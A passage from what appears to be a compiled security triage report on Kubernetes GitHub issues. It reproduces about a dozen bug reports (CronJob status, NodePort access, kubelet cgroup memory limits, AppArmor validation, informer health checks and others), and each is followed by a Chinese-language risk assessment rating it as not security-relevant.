xxxxx-job-28833075  0/1             84m         84m
```
However when I try to list pods I got nothing:
```
$ kubectl get pods --selector=job-name=xxxxx-job-28833075 -n zzz
No resources found in zzz namespace
```

I think the reason was one of the sidecar containers failed to start, however since all pods owned by this job were deleted so I could not debug into this job, my guess is because `.spec.jobTemplate.spec.activeDeadlineSeconds` is set, when job runs > 240 seconds all pods owned by the job are deleted, but in this case should not the job be marked as failed status? Why this job was actually failed but its status was neither completion nor failed?

Also, this stuck job causes 2 following schedules missed, I don't understand since with `.spec.jobTemplate.spec.activeDeadlineSeconds` is set to 4 minutes, should controller schedule a new job after this job was in active status for 4 minutes? 

#### What did you expect to happen?

If any pods/containers owned by a job failed to run, the job should be marked as failed status and all pods/container should be kept (since by default `failedJobsHistoryLimit` is `1`).

#### How can we reproduce it (as minimally and precisely as possible)?

I am not sure if it is expected behavior? 

#### Anything else we need to know?

_No response_

#### Kubernetes version

v1.28.13-eks-a737599

#### Cloud provider

<details>

</details>
AWS

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户发现CronJob的一个任务在Pod被删除后没有被标记为失败状态，导致后续的调度被阻塞。这可能是CronJob控制器的实现逻辑或配置问题。

根据风险判断标准：

1. 该问题无法被攻击者利用，因为这是正常的CronJob行为异常，没有提到任何攻击面的存在。
2. 该问题不可能成为一个漏洞，不会被分配CVE编号，使用CVSS 3.1评分标准也无法达到高危评分。
3. Issue提交者没有在内容中暴露敏感信息或提到安全配置错误等问题。

因此，该Issue不涉及安全风险。

---

## Issue #128328 Master-Node Doesn't server service exposed port

- Issue 链接：[#128328](https://github.com/kubernetes/kubernetes/issues/128328)

### Issue 内容

#### What happened?

Exposed port doesn't serve on Master-Node.

#### What did you expect to happen?

Normally as we expose the port, we can both access the port via master-node and worker-node.

#### How can we reproduce it (as minimally and precisely as possible)?

Seems like master nodes can't serve any services port.

#### Anything else we need to know?

we already expose port in service as below:
Type: NodePort
External Traffic Policy: Cluster

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
No cloud
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Red Hat Enterprise Linux"
VERSION="9.4 (Plow)"
ID="rhel"
ID_LIKE="fedora"
VERSION_ID="9.4"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Red Hat Enterprise Linux 9.4 (Plow)"
ANSI_COLOR="0;31"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:redhat:enterprise_linux:9::baseos"
HOME_URL="https://www.redhat.com/"
DOCUMENTATION_URL="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9"
BUG_REPORT_URL="https://issues.redhat.com/"

REDHAT_BUGZILLA_PRODUCT="Red Hat Enterprise Linux 9"
REDHAT_BUGZILLA_PRODUCT_VERSION=9.4
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.4"
# paste output here
$ uname -a
Linux rhel50 5.14.0-427.40.1.el9_4.x86_64 #1 SMP PREEMPT_DYNAMIC Fri Oct 4 15:22:45 EDT 2024 x86_64 x86_64 x86_64 GNU/Linux
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
INFO[2024-10-25 11:56:25.432610169+07:00] Starting CRI-O, version: 1.30.3, git: 8750e76e814ab80c40061f07402187d6b33ab72e(clean)
Version:        1.30.3
GitCommit:      8750e76e814ab80c40061f07402187d6b33ab72e
GitCommitDate:  2024-07-01T07:09:15Z
GitTreeState:   clean
BuildDate:      1970-01-01T00:00:00Z
GoVersion:      go1.22.0
Compiler:       gc
Platform:       linux/amd64
Linkmode:       static
BuildTags:
  static
  netgo
  osusergo
  exclude_graphdriver_btrfs
  exclude_graphdriver_devicemapper
  seccomp
  apparmor
  selinux
LDFlags:          unknown
SeccompEnabled:   true
AppArmorEnabled:  false
</details>

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico v3.28.1
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
通过对Issue内容的分析，该问题描述了在Kubernetes集群中，使用NodePort类型的Service时，Master节点无法访问暴露的端口，只能通过Worker节点访问。这个问题是关于Kubernetes集群配置和服务访问的问题，没有涉及任何安全漏洞或风险。按照风险判断标准，此Issue不涉及安全问题，风险评级判断为不涉及。

---

## Issue #128326 There is a conflict between the metrics of controller-runtime and component-base, the metric workqueue_depth  of controller-runtime repository not  take effect

- Issue 链接：[#128326](https://github.com/kubernetes/kubernetes/issues/128326)

### Issue 内容

#### What happened?

https://github.com/kubernetes-sigs/controller-runtime/blob/7399a3a595bf254add9d0c96c49af462e1aac193/pkg/metrics/workqueue.go#L99

https://github.com/kubernetes/component-base/blob/03d57670a9cda43def5d9c960823d6d4558e99ff/metrics/prometheus/workqueue/metrics.go#L101

Both repository try to set the Provider but only the earliest will take effect. In the case where component-base library is initialized first, the workqueue_depth metrics in component-base will be used and the metrics in controller-runtime will not work. It will cause the default exposed metrics in controller-runtime to be unable to show the workflow_depth number.

Is there any hint or recommendation for handling that?

#### What did you expect to happen?

The  workqueue_depth  should take effect that provided by controller-runtime repository

#### How can we reproduce it (as minimally and precisely as possible)?

The component-base library might not be directly depended. However, other libraries like k8s.io/apiextensions-apiserver;if the codes in these libraries call component-base functions, the initialization function in component-base will work and might call workqueue.SetProvider before controller-runtime, which will prevent the later controller-runtime from setting its own workqueue_depth metrics.



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

Client Version: version.Info{Major:"1", Minor:"23", GitVersion:"v1.23.17", GitCommit:"953be8927218ec8067e1af2641e540238ffd7576", GitTreeState:"clean", BuildDate:"2023-02-22T13:34:27Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"23", GitVersion:"v1.23.17", GitCommit:"953be8927218ec8067e1af2641e540238ffd7576", GitTreeState:"clean", BuildDate:"2023-02-22T13:27:46Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了controller-runtime和component-base两个库在设置`workqueue_depth`指标时发生冲突，导致controller-runtime中的`workqueue_depth`指标无法生效。这是关于指标收集和展示的技术问题，不涉及任何安全风险。根据风险判断标准第6条："如果Issue不涉及安全问题，则风险评级判断为不涉及"。

---

## Issue #128314 Kubectl exec disconnects automatically after 5m post upgrading the k8s cluster to 1.30

- Issue 链接：[#128314](https://github.com/kubernetes/kubernetes/issues/128314)

### Issue 内容

#### What happened?

We have several automated scripts that run kubectl commands to exec into the pods and execute some custom scripts scripts. We observed that on all clusters running version 1.30.x, the session automatically gets disconnected without any error message, which was not the case in versions lower than 1.30.

#### What did you expect to happen?

Session should not terminate until we disconnect or exit from the pod 

#### How can we reproduce it (as minimally and precisely as possible)?

Just run a script which does kubectl exec into the pod and you will see that it gets disconnected with in 5 min

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.3

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的信息，该Issue描述了在升级到Kubernetes 1.30.x版本后，使用`kubectl exec`进入Pod的会话在5分钟后自动断开的问题。这可能是由于会话超时设置导致的功能性问题，并没有提及任何安全漏洞或潜在的安全风险。按照风险判断标准，第6条：如果Issue不涉及安全问题，则风险评级判断为不涉及。因此，该Issue不涉及安全风险。

---

## Issue #128306 AppArmor type validation fails in `Deployments` when mixing old annotations with `securityContext.appArmorProfile`.

- Issue 链接：[#128306](https://github.com/kubernetes/kubernetes/issues/128306)

### Issue 内容

#### What happened?

Validation may fail when`Deployment` mixes deprecated `container.apparmor.security.beta.kubernetes.io/` annotations with the new `securityContext.appArmorProfile`.

```
The Deployment "xyz" is invalid: spec.template.spec.containers[0].securityContext.appArmorProfile.type: Forbidden: apparmor type in annotation and field must match
```

#### What did you expect to happen?

The validation was expected to pass.

#### How can we reproduce it (as minimally and precisely as possible)?

The following minimal example defines a pod-level default AppArmor profile within the pod-level `securityContext`, while using a deprecated annotation to override the profile at the container-level:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-fails-validation
spec:
  selector:
    matchLabels:
      app: deployment-fails-validation
  template:
    metadata:
      labels:
        app: deployment-fails-validation
      annotations:
        # Container-level override using deprecated annotation.
        container.apparmor.security.beta.kubernetes.io/fails-validation: 'runtime/default'
    spec:
      securityContext:
        appArmorProfile:
          # Pod-level default profile.
          type: Unconfined
      containers:
      - name: fails-validation
        image: alpine:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - "sleep 99999999"
```

When this configuration is applied, the following error occurs:

```
$ kubectl apply -f deployment-fails-validation.yaml
The Deployment "deployment-fails-validation" is invalid: spec.template.spec.containers[0].securityContext.appArmorProfile.type: Forbidden: apparmor type in annotation and field must match
```

The error message suggests that `spec.containers[0].securityContext.appArmorProfile` at the container-level doesn't match the annotation, even though container-level profile is not defined.

#### Anything else we need to know?

I believe the reason for the failure is as follows:

In the [validation code](https://github.com/kubernetes/kubernetes/blob/352056f09df3101d53af74aee30b79e2aba742da/pkg/apis/core/validation/validation.go#L4820-L4858), the pod-level profile `spec.securityContext.appArmorProfile` is retrieved [here](https://github.com/kubernetes/kubernetes/blob/352056f09df3101d53af74aee30b79e2aba742da/pkg/apis/core/validation/validation.go#L4822). During the iteration over each container, this profile is used as the [default value](https://github.com/kubernetes/kubernetes/blob/352056f09df3101d53af74aee30b79e2aba742da/pkg/apis/core/validation/validation.go#L4825). If a container doesn't explicitly set its own AppArmor profile in `spec.containers[i].securityContext.appArmorProfile`, the pod-level profile remains the default. In the provided manifest, this results in the need for all container-level annotations to match the pod-level security context for validation to pass, making it impossible to override the pod-level profile using deprecated annotations.

I believe it would be sufficient to ensure that container-level annotations align with the container-level security context, while ignoring the pod-level security context.

This issue seems to only affect `Deployments`, as e.g. `StatefulSets` do not call this validation function.

The validation logic was introduced in #123435.

I understand this is an uncommon scenario, mixing old and new methods within a single pod, but I wanted to document the issue and the likely cause.

#### Kubernetes version

<details>

```console
 kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.31.0
```
</details>


#### Cloud provider

<details>

</details>


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在Kubernetes中，当将过时的AppArmor注解与新的`securityContext.appArmorProfile`混合使用时，会导致验证失败的问题。这个问题属于配置和兼容性方面的功能性错误，并不涉及安全风险。

根据风险判断标准：

1. 该问题不会被攻击者利用，因为它只影响了配置的验证过程，导致Deployment无法正常创建或更新。

2. 该问题不会成为一个漏洞，也不会被分配CVE编号，按照CVSS 3.1评分标准也不会达到高危级别。

4. 即使将其视为拒绝服务（DoS）攻击，但攻击者需要具有创建或修改Deployment的权限，属于正常的操作权限范围，因此不构成高风险。

因此，该Issue不涉及安全风险。

---

## Issue #128284 kubelet system-reserved unexpectedly sets memory.max in system-reserved-cgroup under systemd

- Issue 链接：[#128284](https://github.com/kubernetes/kubernetes/issues/128284)

### Issue 内容

#### What happened?

When starting kubelet with config `system-reserved=memory=1.5Gi` as part of [reserved
compute resources](https://kubernetes.io/docs/tasks/administer-cluster/reserve-compute-resources/#system-reserved), running under `systemd`, with a `system-reserved-cgroup=systemreserved` (as per [Recommended Cgroups Setup](system-reserved-cgroup=systemreserved), that cgroup (`systemreserved`) has it's memory.max set to the value of `system-reserved=memory`, away from the default which is `memory.max=max`:

*Without* `system-reserved=memory=1.5Gi`:

```
[root@k8s-node1 systemreserved.slice]# pwd
/sys/fs/cgroup/systemreserved.slice
[root@k8s-node1 systemreserved.slice]# cat memory.max 
max
```


*With* `system-reserved=memory=1.5Gi`:
```
[root@k8s-node1 systemreserved.slice]# pwd
/sys/fs/cgroup/systemreserved.slice
[root@k8s-node1 systemreserved.slice]# cat memory.max 
1610612736 # 1.5Gi
```

#### What did you expect to happen?

When I write `system-reserved=memory=1.5Gi` to the kubelet config, I don't expect that to result in `systemreserved` services
(service units within `systemreserved`, such as `sshd`, and any other system service within that cgroup to be collectivly *limmited* with a `memory.max` which sets a [*hard limit*](https://docs.kernel.org/admin-guide/cgroup-v2.html#:~:text=Memory%20usage%20hard%20limit) on these systemreserved services when they previously were not. This feels the *opposite* of what is intended- it should be the inverse (non systemreserved should 'back off' in the face of memory pressure to allow for 1.5G for the `systemreserved` cgroup.
 
Having `memory.max` set that may lead to these `systemreserved` services being *more likely* to be OOM killed since they get altered away from their default `memory.max=max`.


#### How can we reproduce it (as minimally and precisely as possible)?

Start kubelet with --config (or args) with the following:

> Please note you have to restart the entire node to reset (kubelet does not clean up reset `system-reserved=memory=x` back to `max` after removing /restarting kubelet).

Apply the config to your kubelet start behaviour:

```
--system-reserved=memory=1.5Gi
--enforce-node-allocatable=pods,system-reserved
--system-reserved-cgroup=systemreserved
```

Ensure you have created the cgroup `systemreserved`, for example, by adding `Slice=systemreserved` to sshd:

File: /usr/lib/systemd/system/sshd.service
```
[Unit]
Description=OpenSSH server daemon
Documentation=man:sshd(8) man:sshd_config(5)
After=network.target sshd-keygen.target
Wants=sshd-keygen.target

[Service]
Type=notify
EnvironmentFile=-/etc/sysconfig/sshd
ExecStart=/usr/sbin/sshd -D $OPTIONS
ExecReload=/bin/kill -HUP $MAINPID
Slice=systemreserved.slice
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```
And reload your systemd daemon/restart sshds etc. (`systemctl daemon-reload && systemctl restart sshd`)

Observe memory.max being set:

```
[root@k8s-node1 systemreserved.slice]# cd /sys/fs/cgroup/systemreserved.slice
[root@k8s-node1 systemreserved.slice]# cat memory.max 
1610612736 # 1.5Gi
```

#### Anything else we need to know?

I suspect Kubernetes needs to account for the Allocatable memory somewhere, which might by why `memory.max` is being altered?


Chris Down's suggestions may be relvant here, if kubelet *needs* to edit the cgroup, perhaps `memory.low` is more appropriate, and/or perhaps even
better allowing more fine grained control over which memory max/min/low get set rather than `--memory=` which doesn't appear to allow that level of expression.

> Our ultimate goal here is to keep the workload running ... so
what if could could encode that rather than sprinking memory.max everywhere? ... memory.low is a funamental different way about how we've controled memory for the last ~50 years. Instead we should just say how much memory the applications which we want to protect need, and let the system sort it out. ... memory.low hooks into the kernel's reclaiming structure in order to protect some memory for a cgroup. src: https://youtu.be/kPMZYoRxtmg?feature=shared&t=1242

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: v1.29.3+rke2r1
```

</details>


#### Cloud provider

<details>
Bare metal / not applicable
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Rocky Linux"
VERSION="9.3 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.3"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Rocky Linux 9.3 (Blue Onyx)"
SUPPORT_END="2032-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-9"
ROCKY_SUPPORT_PRODUCT_VERSION="9.3"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.3"

$ uname -a
Linux 5.14.0-362.13.1.el9_3.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Dec 13 14:07:45 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用kubelet配置`system-reserved=memory=1.5Gi`时，导致`systemreserved` cgroup的`memory.max`被设置为1.5Gi，而不是默认的`max`，可能导致`systemreserved`中的系统服务（如`sshd`）在内存压力下更容易被OOM杀死。

根据风险判断标准，此问题属于配置引起的系统行为变化，可能导致服务的可用性受到影响。但攻击者需要能够消耗大量内存才能触发OOM，而这通常需要一定权限或资源配额。

同时，该问题不涉及攻击者能够利用的漏洞，不会导致命令执行、提权、容器逃逸等高风险问题。因此，按照给定的标准，风险评级判断为“不涉及”。

---

## Issue #128257 Restore build-tag flag for code-generator

- Issue 链接：[#128257](https://github.com/kubernetes/kubernetes/issues/128257)

### Issue 内容

#### What happened?

The `build-tag` flag is removed in 1.30 as code-generator moved to use `gengo/v2` and removed `gengo/args` dependency where `GeneratedBuildTag` arg resides. As a result, it is not possible to inject a custom build tag during `conversion-gen` and `defaulter-gen` process.

This flag is useful for other projects that need a custom tag to differentiate itself from the default build tag of `gengo` which is `ignore_autogenerated`. By default, `gengo` will ignore all files with the build tag of `ignore_autogenerated`. However, in some cases, some projects need to utilize some conversion and defaults funcs in `k8s.io/kubernetes/pkg/apis/core/v1` such as [1] and [2] and both files are ignored by `gengo` due to mentioned build-tag. By using a custom build tag that is different from the default build tag, those two files can be used during `conversion-gen` and `defaulter-gen` processes.

[1] https://github.com/kubernetes/kubernetes/blob/master/pkg/apis/core/v1/zz_generated.conversion.go
[2] https://github.com/kubernetes/kubernetes/blob/master/pkg/apis/core/v1/zz_generated.defaults.go

#### What did you expect to happen?

The `build-tag` flag shouldn't be deprecated prematurely as it is still useful to inject a custom build tag.

#### How can we reproduce it (as minimally and precisely as possible)?

Run `conversion-gen` or `defaulter-gen` with `--build-tag` flag and the cmd should err out as the flag is deprecated.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.30
</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue讨论了code-generator的`--build-tag`参数在版本1.30中被移除，导致无法在`conversion-gen`和`defaulter-gen`过程中注入自定义的build tag。这使得一些需要使用自定义build tag来包含特定生成文件的项目受到影响。然而，从安全角度来看，这个问题并未引入可被攻击者利用的安全风险，也未导致新的漏洞产生。根据风险判断标准，该Issue不涉及安全问题。

---

## Issue #128246 Unable to reset metric's LabelValueAllowLists during test

- Issue 链接：[#128246](https://github.com/kubernetes/kubernetes/issues/128246)

### Issue 内容

#### What happened?

While trying to add an integration test for `--allow-metric-labels` #128166 (more specifically, on this [commit](https://github.com/kubernetes/kubernetes/commit/36230b63ffd96b8fbe8acb50cf91bf8c9665793a)), I find that metrics' `LabelValueAllowLists` don't reset between tests though TestAPIServers are torn down and brought up in each tests. It caused the integration test failed because the `--allow-metric-labels` doesn't reflect on the targeted metric.

It should be due to that kube-apiserver metrics (and most system component metrics) are global(package level) variables and their [opts](https://github.com/kubernetes/kubernetes/blob/81ce66f059ec9c07cccf4069c8913e31959dea78/staging/src/k8s.io/component-base/metrics/opts.go#L57) are set once when they are imported and cannot be reset afterwards.

#### What did you expect to happen?

There is a way to reset the `LabelValueAllowLists` [opts](https://github.com/kubernetes/kubernetes/blob/81ce66f059ec9c07cccf4069c8913e31959dea78/staging/src/k8s.io/component-base/metrics/opts.go#L57) in the test.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Add a test https://github.com/kubernetes/kubernetes/commit/e62ab1c2a172cbd04245f672e270169a0a8e041e
2. Run test suite on entire package, it would fail.
 ```
go test -v -timeout 30s k8s.io/kubernetes/test/integration/metrics
```
3. However, it would always success when only run the targeted test or comment out all the rest of the tests.
```
go test -v -timeout 30s k8s.io/kubernetes/test/integration/metrics -run ^testAPIServerMetricsLabelsWithAllowList$
```


#### Anything else we need to know?

Solution options:

Option1: Add a `ResetLabelAllowList()` API to the Vec metrics and wrap it with `RestLabelAllowListForTest()` in the system component metrics packages.

Option2: Include the reset label allow list logic inside the current `Reset()` API, which can reduce the effort for extra adoption for the option1's new introduced API.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0-alpha.1.300+55b83c92b3b69c-dirty
```
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在进行集成测试时，无法在测试之间重置metrics的`LabelValueAllowLists`，导致测试失败。原因是kube-apiserver的metrics（以及大多数系统组件的metrics）是全局变量，其选项在导入时只设置一次，之后无法重置。这导致了`--allow-metric-labels`参数在测试中无法反映到目标metric上。

这个问题主要影响测试环境，导致测试结果不准确或失败。但在生产环境中，metrics的`LabelValueAllowLists`不会频繁重置，因此这种情况下的限制不会对系统的安全性产生影响。

根据风险判断标准第6条：**如果Issue不涉及安全问题，则风险评级判断为不涉及**。因此，此Issue不涉及安全风险。

---

## Issue #128233 controllers: Check if informers are synced on `/healthz`/`/readyz`?

- Issue 链接：[#128233](https://github.com/kubernetes/kubernetes/issues/128233)

### Issue 内容

#### What happened?

Right now the kube-apiserver has a readyz check if the informers are synced: 

```
% kubectl get --raw='/readyz/informer-sync'
ok
```

The corresponding source code:
https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/staging/src/k8s.io/apiserver/pkg/server/healthz/healthz.go#L95-L122
https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/staging/src/k8s.io/apiserver/pkg/server/config.go#L897-L901

However, there is no such healthz/readyz check for controllers (kube-controller-manager, kube-scheduler, etc.).

I was wondering whether it would make sense to add such checks if informers are synced. Informers can get out of sync. If we bind this condition to the `/healthz` endpoint and then the `/healthz` endpoint to the liveness probe, then kubelet can restart the Pod if the informer is not synced.

I was wondering while working with informers should the `HasSynced` be checked only on startup or should it be checked periodically?

I am not an expert in the topic. Feel free to comment if the proposal makes sense or not.

kube-controller-manager's `/healthz` endpoint returns status for the various controllers:
```
$ curl -k https://localhost:10257/healthz?verbose
[+]leaderElection ok
[+]serviceaccount-token-controller ok
[+]cronjob-controller ok
[+]certificatesigningrequest-signing-controller ok
[+]node-lifecycle-controller ok
[+]endpointslice-controller ok
[+]daemonset-controller ok
[+]statefulset-controller ok
[+]bootstrap-signer-controller ok
[+]persistentvolumeclaim-protection-controller ok
[+]persistentvolume-protection-controller ok
[+]garbage-collector-controller ok
[+]job-controller ok
[+]deployment-controller ok
[+]node-ipam-controller ok
[+]persistentvolume-attach-detach-controller ok
[+]validatingadmissionpolicy-status-controller ok
[+]endpoints-controller ok
[+]certificatesigningrequest-cleaner-controller ok
[+]persistentvolume-binder-controller ok
[+]ttl-after-finished-controller ok
[+]ephemeral-volume-controller ok
[+]resourcequota-controller ok
[+]namespace-controller ok
[+]replicaset-controller ok
[+]ttl-controller ok
[+]legacy-serviceaccount-token-cleaner-controller ok
[+]endpointslice-mirroring-controller ok
[+]pod-garbage-collector-controller ok
[+]disruption-controller ok
[+]token-cleaner-controller ok
[+]persistentvolume-expander-controller ok
[+]replicationcontroller-controller ok
[+]serviceaccount-controller ok
[+]horizontal-pod-autoscaler-controller ok
[+]certificatesigningrequest-approving-controller ok
[+]clusterrole-aggregation-controller ok
[+]root-ca-certificate-publisher-controller ok
[+]taint-eviction-controller ok
healthz check passed
```

However, I am not sure if there is a meaningful check behind it. 
According to https://github.com/kubernetes/kubernetes/blob/948afe5ca072329a73c8e79ed5938717a5cb3d21/cmd/kube-controller-manager/app/controllermanager.go#L779-L795, `controllerhealthz.NamedPingChecker` is being used as I don't see implementation of `controller.HealthCheckable` in the source code. It always returns `nil` (reports no issues; does not perform a meaningful check).

#### What did you expect to happen?

Issues with the underlying informers to be reflected in `/healthz`/`/readyz` endpoints for controller components like kube-controller-manager, kube-proxy, etc.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Start kube-controller-manager with low qps and burst settings to reproduce informers out of sync issues.

```
--kube-api-qps=1
--kube-api-burst=1
```

2. Create a Deployment and scale it to 100 replicas

3. Make sure the kube-controller-manager logs are full with client-side throttling errors
```
I1021 13:24:04.441128       1 request.go:700] Waited for 25.992938012s due to client-side throttling, not priority and fairness, request: POST:https://kube-apiserver/api/v1/namespaces/default/pods
I1021 13:24:05.441182       1 request.go:700] Waited for 26.992997013s due to client-side throttling, not priority and fairness, request: POST:https://kube-apiserver/api/v1/namespaces/default/pods
```

and the issue is not reflected in the `/healthz`/`/readyz` endpoint.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue讨论的是在kube-controller-manager等控制器组件中是否需要添加Informer同步的健康检查，以便当Informer不同步时可以通过`/healthz`或`/readyz`接口反映出来，从而触发kubelet重启Pod。Issue的内容主要集中在改进系统的健康检查机制，以提高系统的健壮性和可用性。

根据提供的风险判断标准：

1. 该Issue未涉及可能被攻击者利用的风险。
2. 该Issue未引入可能被分配CVE编号的漏洞，按照CVSS 3.1评分标准，无法评定为高风险。
6. 该Issue不涉及安全问题，风险评级判断为“不涉及”。

因此，本Issue不涉及安全风险。

---

## Issue #128210 Teste

- Issue 链接：[#128210](https://github.com/kubernetes/kubernetes/issues/128210)

### Issue 内容

#### What happened?

teste

#### What did you expect to happen?

teste

#### How can we reproduce it (as minimally and precisely as possible)?

teste

#### Anything else we need to know?

teste

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue的标题和内容都是“Teste”，没有提供任何具体的信息、描述或上下文，也没有涉及任何安全相关的问题或潜在风险。因此，无法从中分析出任何潜在的安全风险或漏洞。

---

## Issue #128207 oidc config and AuthenticationConfiguration can not config both，but AuthenticationConfiguration does not have signing-algs config，lead to problem？

- Issue 链接：[#128207](https://github.com/kubernetes/kubernetes/issues/128207)

### Issue 内容

#### What happened?

    - --oidc-signing-algs=RS512

```
apiVersion: apiserver.config.k8s.io/v1beta1
kind: AuthenticationConfiguration
jwt:
- issuer:
    # url 在所有认证组件中必须是唯一的。
    # url 不得与 --service-account-issuer 中配置的颁发者冲突。
    url: https://cas.example.org/cas/oidc
    # discoveryURL（如果指定）将覆盖用于获取发现信息的 URL，而不是使用 “{url}/.well-known/openid-configuration”。
    # 系统会使用所给的配置值，因此如果需要，“/.well-known/openid-configuration” 必须包含在 discoveryURL 中。
    #
    # 取回的发现信息中的 “issuer” 字段必须与 AuthenticationConfiguration 中的
    # “issuer.url” 字段匹配，并被用于验证所呈现的 JWT 中的 “iss” 声明。
    # 这适用于众所周知的端点和 jwks 端点托管在与颁发者不同的位置（例如集群本地）的场景。
    # discoveryURL 必须与 url 不同（如果指定），并且在所有认证组件中必须是唯一的。
    discoveryURL: https://cas.example.org/cas/oidc/.well-known/openid-configuration
    # PEM 编码的 CA 证书用于在获取发现信息时验证连接。
    # 如果未设置，将使用系统验证程序。
